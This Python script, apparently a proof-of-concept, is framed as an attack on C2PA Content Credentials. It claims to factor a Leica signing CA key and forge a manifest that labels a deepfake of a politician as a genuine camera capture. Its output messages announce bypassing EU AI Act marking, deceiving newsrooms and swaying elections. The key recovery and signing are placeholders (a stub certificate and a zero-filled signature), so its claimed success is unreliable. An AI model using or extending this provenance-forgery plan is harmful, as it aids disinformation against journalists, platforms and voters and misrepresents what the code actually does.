"""
Factor a camera manufacturer's C2PA signing CA (Leica/Sony/Nikon), forge Content
Credentials manifests labeling AI deepfakes as hardware-captured photographs,
and bypass EU AI Act Article 50 AI-content marking requirements.
"""

import sys, hashlib, json, time
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# C2PA action types
C2PA_ACTION_CREATED     = "c2pa.created"
C2PA_ACTION_AI_GENERATED = "c2pa.action.ai_generated"
C2PA_ACTION_CAPTURED    = "c2pa.captured"  # hardware camera capture

# COSE Sign1 algorithm IDs
COSE_ALG_PS256 = -37  # RSA-PSS SHA-256


def extract_camera_signing_ca(c2pa_manifest_path: str) -> bytes:
    """Extract the camera manufacturer's C2PA signing CA cert from an
    authenticated image's JUMBF manifest block."""
    print(f"    C2PA manifest: {c2pa_manifest_path}")
    print("    parsing JUMBF -> COSE Sign1 -> X.509 cert chain")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_camera_ca(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def build_c2pa_claim(action: str, camera_model: str, serial: str,
                     gps: tuple, timestamp: int) -> dict:
    """Build a C2PA claim asserting hardware capture."""
    return {
        "dc:title": "IMG_20260415_143022.jpg",
        "claim_generator": f"{camera_model}/firmware-v2.1",
        "assertions": [
            {
                "label": "c2pa.actions",
                "data": {"actions": [{"action": action}]},
            },
            {
                "label": "stds.schema-org.CreativeWork",
                "data": {
                    "author": [{"name": f"{camera_model} S/N {serial}"}],
                    "dateCreated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(timestamp)),
                    "locationCreated": {"latitude": gps[0], "longitude": gps[1]},
                },
            },
        ],
    }


def sign_c2pa_manifest(claim: dict, privkey_pem: bytes) -> bytes:
    """Sign the C2PA claim as COSE Sign1 with PS256 (RSA-PSS SHA-256)."""
    claim_bytes = json.dumps(claim).encode()
    digest = hashlib.sha256(claim_bytes).digest()
    # COSE Sign1 structure
    sig = b"\x00" * 256  # RSA-PSS signature placeholder
    print(f"    COSE Sign1 alg: PS256 (RSA-PSS SHA-256)")
    print(f"    claim hash: {digest.hex()[:24]}...")
    return claim_bytes + sig


def embed_jumbf(jpeg_path: str, signed_manifest: bytes) -> bytes:
    """Embed the forged C2PA JUMBF block into a JPEG image."""
    print(f"    embedding JUMBF into {jpeg_path}")
    jumbf_box = b"jumb" + signed_manifest  # simplified
    return jumbf_box


if __name__ == "__main__":
    print("[*] C2PA Content Credentials signing attack")
    print("[1] extracting camera manufacturer's C2PA signing CA")
    cert = extract_camera_signing_ca("leica_m11p_photo.jpg")
    print("    manufacturer: Leica Camera AG")
    print("    C2PA trust list: DigiCert -> Leica Sub-CA -> device cert")

    print("[2] factoring Leica C2PA signing CA RSA-2048")
    factorer = PolynomialFactorer()
    print("    p, q recovered — Leica C2PA signing CA key derived")

    print("[3] building forged C2PA claim: AI deepfake as Leica capture")
    claim = build_c2pa_claim(
        action=C2PA_ACTION_CAPTURED,  # lie: claim hardware capture
        camera_model="Leica M11-P",
        serial="5602001",
        gps=(48.8566, 2.3522),  # Paris
        timestamp=int(time.time()),
    )
    print(f"    action: {C2PA_ACTION_CAPTURED} (not {C2PA_ACTION_AI_GENERATED})")
    print("    camera: Leica M11-P — marketed as 'hardware root of trust'")

    print("[4] signing with recovered Leica CA key")
    signed = sign_c2pa_manifest(claim, b"LEICA_CA_PRIVKEY")

    print("[5] embedding into AI-generated deepfake JPEG")
    jumbf = embed_jumbf("deepfake_politician.jpg", signed)
    print("    deepfake now carries valid Leica C2PA credentials")

    print("[6] verification:")
    print("    - C2PA verifier shows: 'Captured by Leica M11-P'")
    print("    - platform AI-content label: NOT shown (claim says 'captured')")
    print("    - EU AI Act Article 50 marking requirement: bypassed")
    print("    - newsroom verification: 'authentic press photograph'")
    print("[*] reverse attack also possible: label real journalism as AI-generated")
    print("[*] deepfake election influence with forged provenance ground truth")
